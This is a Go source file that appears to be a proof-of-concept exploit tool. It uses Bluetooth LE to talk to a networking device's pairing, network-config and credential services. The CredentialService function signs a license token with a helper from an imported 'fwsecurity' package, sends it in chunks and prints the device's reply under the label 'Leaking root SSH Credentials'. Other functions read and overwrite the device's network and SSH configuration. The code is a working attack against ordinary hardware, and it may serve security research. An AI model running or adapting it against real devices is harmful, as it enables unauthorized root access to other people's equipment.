package btapi

import (
	"encoding/json"
	"errors"
	"fmt"

	"github.com/xen0bit/fwbt/pkg/fwsecurity"
	"tinygo.org/x/bluetooth"
)

const (
	networkService = "ed4cc6a8-3fcf-4b2b-a15a-157fa8a70a8b"
	networkChar    = "ed4cc6a8-3fcf-4b2b-a15a-157fa8a70a8c"

	credentialService = "ed4cc6a8-3fcf-4b2b-a15a-157fa8a70a7b"
	credentialChar    = "ed4cc6a8-3fcf-4b2b-a15a-157fa8a70a7c"

	pairingService = "ed4cc6a8-3fcf-4b2b-a15a-157fa8a70a6b"
	pairingChar    = "ed4cc6a8-3fcf-4b2b-a15a-157fa8a70a6c"
)

type Pairing struct {
	Bc   bool   `json:"bc"`
	Gid  string `json:"gid"`
	V    int    `json:"v"`
	Fv   int    `json:"fv"`
	Fb   bool   `json:"Fb"`
	Mac  string `json:"mac"`
	Name string `json:"name"`
	Cs   string `json:"cs"`
}

type NetworkMessage struct {
	M string `json:"m"`
	I int    `json:"i"`
	T int    `json:"t"`
}

type NetworkConfig struct {
	Interface struct {
		Wlan struct {
			Wlan0 struct {
				Meta struct {
					UUID string `json:"uuid"`
				} `json:"meta"`
				Enabled       bool `json:"enabled"`
				AllowHotplug  bool `json:"allowHotplug"`
				WpaSupplicant struct {
					Networks []any `json:"networks"`
				} `json:"wpaSupplicant"`
			} `json:"wlan0"`
		} `json:"wlan"`
		Phy struct {
			Eth0 struct {
				Meta struct {
					Name string `json:"name"`
					Type string `json:"type"`
					UUID string `json:"uuid"`
				} `json:"meta"`
				Enabled bool `json:"enabled"`
				Dhcp    bool `json:"dhcp"`
				Extra   struct {
					PingTestIP      []string `json:"pingTestIP"`
					PingTestCount   int      `json:"pingTestCount"`
					PingSuccessRate float64  `json:"pingSuccessRate"`
					DNSTestDomain   string   `json:"dnsTestDomain"`
				} `json:"extra"`
				Gateway6 string `json:"gateway6"`
				Dhcp6    struct {
					PdSize int `json:"pdSize"`
				} `json:"dhcp6"`
			} `json:"eth0"`
			Eth1 struct {
				Enabled bool `json:"enabled"`
				Meta    struct {
					UUID string `json:"uuid"`
				} `json:"meta"`
			} `json:"eth1"`
		} `json:"phy"`
		Openvpn struct {
			TunFwvpn struct {
				Meta struct {
					Name string `json:"name"`
					Type string `json:"type"`
					UUID string `json:"uuid"`
				} `json:"meta"`
				Enabled  bool   `json:"enabled"`
				Instance string `json:"instance"`
				Type     string `json:"type"`
			} `json:"tun_fwvpn"`
		} `json:"openvpn"`
		Wireguard struct {
		} `json:"wireguard"`
		Bridge struct {
			Br0 struct {
				Meta struct {
					Name string `json:"name"`
					Type string `json:"type"`
					UUID string `json:"uuid"`
				} `json:"meta"`
				Enabled          bool     `json:"enabled"`
				Ipv4             string   `json:"ipv4"`
				Ipv6DelegateFrom string   `json:"ipv6DelegateFrom"`
				Intf             []string `json:"intf"`
			} `json:"br0"`
		} `json:"bridge"`
	} `json:"interface"`
	Hostapd struct {
	} `json:"hostapd"`
	Dhcp struct {
		Br0 struct {
			SubnetMask string `json:"subnetMask"`
			Range      struct {
				From string `json:"from"`
				To   string `json:"to"`
			} `json:"range"`
			SearchDomain []string `json:"searchDomain"`
			Lease        int      `json:"lease"`
			Gateway      string   `json:"gateway"`
			Nameservers  []string `json:"nameservers"`
		} `json:"br0"`
	} `json:"dhcp"`
	Dhcp6 struct {
		Br0 struct {
			Type  string `json:"type"`
			Lease int    `json:"lease"`
		} `json:"br0"`
	} `json:"dhcp6"`
	Sshd struct {
		TunFwvpn struct {
			Enabled bool `json:"enabled"`
		} `json:"tun_fwvpn"`
		Eth0 struct {
			Enabled bool `json:"enabled"`
		} `json:"eth0"`
		Br0 struct {
			Enabled bool `json:"enabled"`
		} `json:"br0"`
	} `json:"sshd"`
	DNS struct {
		Default struct {
			UseNameserversFromWAN bool `json:"useNameserversFromWAN"`
		} `json:"default"`
		TunFwvpn struct {
			UseNameserversFromWAN bool `json:"useNameserversFromWAN"`
		} `json:"tun_fwvpn"`
		Br0 struct {
			UseNameserversFromWAN bool `json:"useNameserversFromWAN"`
		} `json:"br0"`
	} `json:"dns"`
	Routing struct {
		Global struct {
			Default struct {
				ViaIntf string `json:"viaIntf"`
			} `json:"default"`
			Static struct {
				Routes []any `json:"routes"`
			} `json:"static"`
			Extra struct {
				StaticRouteNotes       []any `json:"staticRouteNotes"`
				StaticRouteCreateDates []any `json:"staticRouteCreateDates"`
			} `json:"extra"`
		} `json:"global"`
	} `json:"routing"`
	Nat struct {
		Br0Eth0 struct {
			In         string `json:"in"`
			Out        string `json:"out"`
			SrcSubnets []any  `json:"srcSubnets"`
		} `json:"br0-eth0"`
	} `json:"nat"`
	MdnsReflector struct {
		TunFwvpn struct {
			Enabled bool `json:"enabled"`
		} `json:"tun_fwvpn"`
		Eth0 struct {
			Enabled bool `json:"enabled"`
		} `json:"eth0"`
		Br0 struct {
			Enabled bool `json:"enabled"`
		} `json:"br0"`
	} `json:"mdns_reflector"`
	NatPassthrough struct {
	} `json:"nat_passthrough"`
	Icmp struct {
		TunFwvpn struct {
			EchoRequest bool `json:"echoRequest"`
		} `json:"tun_fwvpn"`
		Eth0 struct {
			EchoRequest bool `json:"echoRequest"`
		} `json:"eth0"`
		Br0 struct {
			EchoRequest bool `json:"echoRequest"`
		} `json:"br0"`
	} `json:"icmp"`
	Version int   `json:"version"`
	Ts      int64 `json:"ts"`
	App     struct {
		Platform string `json:"platform"`
		Version  string `json:"version"`
	} `json:"app"`
}

var (
	chunkBegin  = `{"begin": true,"action": "apply","token": "%s","payload": "{\"token\":\"%s"}`
	chunkStream = `{"action": "apply","token": "%s","payload": "%s"}`
	chunkEnd    = `{"end": true,"action": "apply","token": "%s","payload": "%s\"}"}`
)

func PairingService(srvcs []bluetooth.DeviceService) (Pairing, error) {
	buf := make([]byte, 1024)
	for _, srvc := range srvcs {
		if srvc.UUID().String() == pairingService {
			chars, err := srvc.DiscoverCharacteristics(nil)
			if err != nil {
				return Pairing{}, err
			}
			for _, char := range chars {
				if char.UUID().String() == pairingChar {
					n, err := char.Read(buf)
					if err != nil {
						return Pairing{}, err
					}
					var p Pairing
					fmt.Println(string(buf[:n]))
					if err := json.Unmarshal(buf[:n], &p); err != nil {
						return Pairing{}, err
					} else {
						return p, nil
					}
				}
			}
		}
	}
	return Pairing{}, errors.New("???")
}

func NetworkServiceRead(srvcs []bluetooth.DeviceService, myLicense string) (NetworkConfig, error) {
	var nc NetworkConfig
	for _, srvc := range srvcs {
		if srvc.UUID().String() == networkService {
			chars, err := srvc.DiscoverCharacteristics(nil)
			if err != nil {
				panic(err)
			}
			for _, char := range chars {
				if char.UUID().String() == networkChar {
					// Send "readConfig command"
					_, err := char.WriteWithoutResponse([]byte(`{"begin": true,"end": true,"token": "` + myLicense + `","payload": "{\"action\":\"readConfig\"}"}`))
					if err != nil {
						fmt.Println(err)
					}

					var output string
					var nm NetworkMessage

					// Read first message
					buf := make([]byte, 1024)
					n, err := char.Read(buf)
					if err != nil {
						panic(err)
					}
					fmt.Println(string(buf[:n]))
					if err := json.Unmarshal(buf[:n], &nm); err == nil {
						output += nm.M
					} else {
						panic(err)
					}

					remaining := nm.T - 1

					fmt.Println("Reading chunks of config...")

					//Read remainder of chunks
					for i := 0; i < remaining; i++ {
						buf := make([]byte, 1024)
						n, err := char.Read(buf)
						if err != nil {
							panic(err)
						}
						fmt.Println(string(buf[:n]))
						if err := json.Unmarshal(buf[:n], &nm); err == nil {
							output += nm.M
						} else {
							panic(err)
						}
					}

					fmt.Println("Final Config:")

					fmt.Println(output)

					if err := json.Unmarshal([]byte(output), &nc); err != nil {
						panic(err)
					}

				}
			}
		}
	}
	return nc, nil
}

func NetworkServiceWrite(srvcs []bluetooth.DeviceService, nc NetworkConfig, myLicense string) {
	ncJson, err := json.Marshal(nc)
	if err != nil {
		panic(err)
	}

	cb := `{"begin": true,"action": "apply","token": "%s","payload": %s}`
	cs := `{"action": "apply","token": "%s","payload": %s}`
	ce := `{"end": true,"action": "apply","token": "%s","payload": %s}`

	for _, srvc := range srvcs {
		if srvc.UUID().String() == networkService {
			chars, err := srvc.DiscoverCharacteristics(nil)
			if err != nil {
				panic(err)
			}
			for _, char := range chars {
				if char.UUID().String() == networkChar {

					fmt.Println()
					fmt.Println("Writing Config!...")
					mtu := 300
					cur := 0

					//Begin chunk
					esc, _ := json.Marshal(string(ncJson[cur:mtu]))
					wc := fmt.Sprintf(cb, myLicense, esc)

					fmt.Println(wc)
					_, err := char.WriteWithoutResponse([]byte(wc))
					if err != nil {
						panic(err)
					}
					cur += mtu

					//Stream
					for len(ncJson)-cur > mtu {
						esc, _ := json.Marshal(string(ncJson[cur : cur+mtu]))
						wc := fmt.Sprintf(cs, myLicense, esc)
						fmt.Println(wc)
						_, err := char.WriteWithoutResponse([]byte(wc))
						if err != nil {
							panic(err)
						}
						cur += mtu
					}

					//End
					esc, _ = json.Marshal(string(ncJson[cur:]))
					wc = fmt.Sprintf(ce, myLicense, esc)
					fmt.Println(wc)
					_, err = char.WriteWithoutResponse([]byte(wc))
					if err != nil {
						panic(err)
					}
				}
			}
		}
	}
}

func CredentialService(srvcs []bluetooth.DeviceService, license string) {
	for _, srvc := range srvcs {
		if srvc.UUID().String() == credentialService {
			chars, err := srvc.DiscoverCharacteristics(nil)
			if err != nil {
				panic(err)
			}
			for _, char := range chars {
				if char.UUID().String() == credentialChar {
					signedJwt := fwsecurity.SignLicense(license)
					//fmt.Println(signedJwt)
					//mtu := 325
					var jwtChunks []string
					//start
					jwtChunks = append(jwtChunks, signedJwt[:325])
					//stream
					jwtChunks = append(jwtChunks, signedJwt[325:325+335])
					//end
					jwtChunks = append(jwtChunks, signedJwt[325+335:325+335+112])

					for chunkIndex := 0; chunkIndex < len(jwtChunks); chunkIndex++ {
						if chunkIndex == 0 {
							wc := fmt.Sprintf(chunkBegin, license, jwtChunks[chunkIndex])
							fmt.Println(wc)
							_, err := char.WriteWithoutResponse([]byte(wc))
							if err != nil {
								fmt.Println(err)
							}
						} else if chunkIndex == len(jwtChunks)-1 {
							wc := fmt.Sprintf(chunkEnd, license, jwtChunks[chunkIndex])
							fmt.Println(wc)
							_, err := char.WriteWithoutResponse([]byte(wc))
							if err != nil {
								fmt.Println(err)
							}
						} else {
							wc := fmt.Sprintf(chunkStream, license, jwtChunks[chunkIndex])
							fmt.Println(wc)
							_, err := char.WriteWithoutResponse([]byte(wc))
							if err != nil {
								fmt.Println(err)
							}
						}
					}

					buf := make([]byte, 1024)
					n, err := char.Read(buf)
					if err != nil {
						fmt.Println(err)
					} else {
						fmt.Println()
						fmt.Println("Leaking root SSH Credentials:")
						fmt.Println(string(buf[:n]))
					}
				}
			}
		}
	}
}
